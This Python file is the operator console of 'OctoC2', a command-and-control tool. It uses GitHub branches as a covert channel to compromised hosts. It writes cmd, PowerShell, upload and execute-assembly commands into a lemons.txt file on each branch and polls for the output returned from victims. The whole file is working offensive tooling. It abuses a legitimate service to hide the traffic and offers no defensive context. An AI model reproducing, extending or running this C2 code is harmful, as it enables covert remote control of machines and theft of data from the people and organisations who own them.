import threading
import time, os, sys
import readline, glob
from datetime import datetime, timedelta
from github import Github # type: ignore
from util.constants import (
    TOKEN, CURRENT_BRANCH, MAIN_BRANCH,
    POLLING_INTERVAL, LEMONS_FILE, REPO_OWNER, REPO_NAME,
    branches_lock, seen_branches
)
from util.colors import *

class Repo:
    def __init__(self):
        self.github = Github(TOKEN)
        self.repo = self.github.get_repo(f"{REPO_OWNER}/{REPO_NAME}")
        self.current_branch = "<< OctoC2 >>"

        self.branch_lock = threading.Lock() # Lock for thread safety
        self.stop_thread = threading.Event()

    ### GitHub interaction Functions  
    def list_branches(self):
        """List all branches except the main branch and get the last modified time of history.txt."""
        branches_info = []
        branches = self.repo.get_branches()

        for branch in branches:
            if branch.name != MAIN_BRANCH:
                try:
                    # Get the history.txt file details in the respective branch
                    file_info = self.repo.get_contents("history.txt", ref=branch.name)
                    last_modified = file_info.last_modified if hasattr(file_info, 'last_modified') else "Unknown"
                except Exception:
                    last_modified = "File not found or error"
                branches_info.append((branch.name, last_modified))

        return branches_info

    def switch_branch(self, branch_name):
        """Switch to a branch and start polling for new files."""
        self.stop_thread.set()
        self.current_branch = branch_name
        print(f"[>] Switched to octo {MAGENTA}'{self.current_branch}'{RESET}")
        # Start a background thread to poll for new files
        time.sleep(POLLING_INTERVAL+.5)
        self.stop_thread.clear()
        poll_thread = threading.Thread(target=self.poll_for_tentacle_data, daemon=True)
        poll_thread.start()

    def update_lemons(self, new_content):
        """Update lemons.txt file and commit/push changes."""
        max_retries = 3  # Retry a few times in case of a conflict
        retries = 0

        while retries < max_retries:
            try:
                # Fetch the latest version of the file
                contents = self.repo.get_contents(LEMONS_FILE, ref=self.current_branch)

                # Attempt to update the file
                self.repo.update_file(contents.path, f"Sent command to {LEMONS_FILE}: {new_content}",
                                    new_content, contents.sha, branch=self.current_branch)
                print(f"[*] Sent command to {self.current_branch}: {new_content}")
                break  # Exit the loop if successful

            except Exception as e:
                if "does not match" in str(e) and retries < max_retries - 1:
                    print(f"[!] Conflict detected, retrying... ({retries + 1}/{max_retries})")
                    retries += 1
                    time.sleep(2)  # Short delay before retrying
                else:
                    print(f"[-] Failed to update {LEMONS_FILE}: {str(e)}")
                    break

    def poll_for_new_branches(self):
        """Poll for new branches in the repository."""
        previous_branches = set([branch[0] for branch in self.list_branches()])

        while True:
            try:
                current_branches = set([branch[0] for branch in self.list_branches()])
                new_branches = current_branches - previous_branches  # Only get new branches

                if new_branches:
                    for new_branch in new_branches:
                        print(f"\n\n{BOLD}[+] New octo! - {MAGENTA}{new_branch}{RESET}")
                    previous_branches = current_branches  # Update the set of branches
                time.sleep(4)
            except Exception as e:
                print(f"[-] Error while polling for branches: {e}")
                time.sleep(4)

    def poll_for_new_files_in_branch(self, branch):
        """Poll for new files added to the current branch."""
        current_octo = self.current_branch
        seen_files = []

        # Run first to populate without dumping to screen
        contents = self.repo.get_contents(branch, ref=branch)
        while contents:
            file_attrs = contents.pop(0)
            if file_attrs.path not in seen_files:
                if hasattr(file_attrs, 'last_modified') and file_attrs.last_modified:
                    file_modified_time = datetime.strptime(file_attrs.last_modified, '%a, %d %b %Y %H:%M:%S %Z')
                    seen_files.append(file_attrs.path)
        
        while not self.stop_thread.is_set():
            try:
                contents = self.repo.get_contents(f"{branch}", ref=branch)

                if contents is None:
                    time.sleep(POLLING_INTERVAL)
                    continue

                while contents:
                    file_attrs = contents.pop(0)
                    if file_attrs.path not in seen_files:
                        if hasattr(file_attrs, 'last_modified') and file_attrs.last_modified:
                            file_modified_time = datetime.strptime(file_attrs.last_modified, '%a, %d %b %Y %H:%M:%S %Z')
                            print(f'\n{BOLD}{BLUE}[+] New tentacle data from octo: {self.current_branch}: {file_attrs.path}{RESET}')
                            file_content = self.repo.get_contents(file_attrs.path, ref=branch).decoded_content.decode('utf-8')
                            print(f"\n{file_content}")
                            seen_files.append(file_attrs.path)
                                
                time.sleep(POLLING_INTERVAL)

            except Exception as ex:
                #print(f"[-] Error while polling for new files: {str(ex)}")
                time.sleep(POLLING_INTERVAL)
        print(f"{BOLD}{RED}[>] Exiting poll for {current_octo}{RESET}")

    def poll_for_tentacle_data(self):
        """Poll for contents of lemons.txt and fetch the specified file if conditions are met."""
        current_octo = self.current_branch

        # Get initial value so we don't print the last tentacle result when switching
        last_poll = ""
        lemons_data = self.repo.get_contents(LEMONS_FILE, ref=current_octo)
        if lemons_data is not None:
            lemons_content = lemons_data.decoded_content.decode('utf-8')
            tentacle_tag = f"{current_octo}/"
            if lemons_content.startswith(tentacle_tag) and lemons_content.endswith(".txt") and lemons_content != last_poll:
                last_poll = lemons_content

        while not self.stop_thread.is_set():
            try:
                # Get the contents of lemons.txt
                lemons_data = self.repo.get_contents(LEMONS_FILE, ref=current_octo)
                if lemons_data is not None:
                    lemons_content = lemons_data.decoded_content.decode('utf-8')
                
                    # Check if the contents start with "{current_octo}/file.txt"
                    tentacle_tag = f"{current_octo}/"
                    if lemons_content.startswith(tentacle_tag) and lemons_content.endswith(".txt") and lemons_content != last_poll:
                        # Tentacle data received! Fetch the specified file contents
                        tentacle_data = self.repo.get_contents(lemons_content, ref=current_octo)
                        if tentacle_data is not None:
                            tentacle_content = tentacle_data.decoded_content.decode('utf-8')
                            print(f"\n{BOLD}{GREEN}[+] Content of {lemons_content}:{RESET}\n{tentacle_content}")

                            # This was me trying to fix the prompt issue...but MSF doesn't fix it so who cares. Sliver does and it's slick...
                            # print(f"({BOLD}{UNDERLINE}{MAGENTA}{current_octo}{RESET})-> ", end="")
                            last_poll = lemons_content
                        else:
                            print(f"{BOLD}{RED}[!] Error: {lemons_content} not found.{RESET}")
                else:
                    print(f"{BOLD}{RED}[!] lemons.txt not found in branch {current_octo}.{RESET}") 
            except Exception as ex:
                # Handle errors
                print(f"[-] Error while polling for file content: {str(ex)}")
                time.sleep(POLLING_INTERVAL)


    ### Shell functions
    def print_help(self):
        help_message = '''
            Commands:
                - branch <branch_name>      Switch to new branch
                - use <branch_name>         Switch to new branch
                - help                      That's me :)
                - help <cmd>                Help for specific command
                - exit                      Exit C2
                - upload <file_path>        Upload local file to branch & send to octo
        '''
        print(help_message)

    def setup_shell_environment(self):
        """Setup command history and tab completion."""
        readline.set_completer(self.complete)
        readline.parse_and_bind("tab: complete")
        history_file = ".python_shell_history"
        try:
            readline.read_history_file(history_file)
        except FileNotFoundError:
            pass

        import atexit
        atexit.register(readline.write_history_file, history_file)

    def complete(self, text, state):
        """Auto-completion for commands."""
        buffer = readline.get_line_buffer().split()

        if buffer and buffer[0] in ["branch", "use"]:
            branches = [branch_info[0] for branch_info in self.list_branches()]  # Get branch names for auto-completion
            matches = [branch for branch in branches if branch.startswith(text)]
        elif buffer and buffer[0] == "upload":
            matches = glob.glob(text + '*')  # Get file names for auto-completion
        else:
            matches = []  # No matches in case of unknown command

        return matches[state] if state < len(matches) else None

    def run(self):
        """Run the shell interface."""
        self.setup_shell_environment()
        self.poll_thread = threading.Thread(target=self.poll_for_new_branches, daemon=True)
        self.poll_thread.start()

        while True:
            try:
                command = input(f"({BOLD}{UNDERLINE}{MAGENTA}{self.current_branch}{RESET})-> ").strip()
                self.handle_command(command)
            except KeyboardInterrupt:
                print("\n[-] Use 'exit' to exit the shell.")
            except EOFError:
                print("\nExiting shell...")
                break

    def handle_command(self, command):
        """Handle the input commands."""
        if command == "exit":
            print(f"\n{RED}[*] Exiting shell...{RESET}")
            exit(0)
        elif command.startswith("branch ") or command.startswith("octo "):
            _, branch = command.split(" ", 1)
            branches = [branch_info[0] for branch_info in self.list_branches()]
            if branch not in branches:
                print(f"[-] Branch '{branch}' does not exist.")
            else:
                CURRENT_BRANCH = self.switch_branch(branch)
        elif command == "octos" or command == "branches":
            self.list_octos_with_info()
        elif command.startswith("upload "):
            if self.current_branch is None or self.current_branch == "<< OctoC2 >>":
                print(f"{RED}[-] Please select an octo first.{RESET}")
                return

            _, file_path = command.split(" ", 1)
            if os.path.exists(file_path):
                try:
                    with open(file_path, "r") as file:
                        new_content = file.read()
                    self.update_lemons(command)
                except Exception as e:
                    print(f"[-] Error reading file: {str(e)}")
            else:
                print(f"[-] File '{file_path}' does not exist.")        
        elif command.startswith("cmd ") or command.startswith("powershell ") or command.startswith("pwsh "):
            if self.current_branch is None or self.current_branch == "<< OctoC2 >>":
                print(f"{RED}[-] Please select an octo first.{RESET}")
                return
            self.update_lemons(command)
        elif command.startswith("ls"):
            self.update_lemons(command)
        elif command.startswith("cd"):
            self.update_lemons(command)
        elif command.startswith("ex-asm"):
            self.update_lemons(command)
        elif command == "help":
            self.print_help()
        elif command.startswith("help "):
            _, help_cmd = command.split(" ")
            print(f"[*] Help for {help_cmd}: [Help information]")
        elif not command:
            return  # Ignore empty command
        else:
            print("[-] Unknown command")
            self.print_help()

    def is_recent(self, file_datetime):
        """Check if the file was added in the last 5 minutes."""
        now = datetime.now()
        time_diff = now - file_datetime
        return time_diff <= timedelta(minutes=5)

    def list_octos_with_info(self):
        """List branches with their last modified time."""
        branches_info = self.list_branches()
        print(f"\n{BOLD}{CYAN}[+] All octos:{RESET}")
        for branch_info in branches_info:
            branch_name, last_modified = branch_info
            print(f"    - {BOLD}{MAGENTA}{branch_name}{RESET} (Last modified: {last_modified})")
        print()
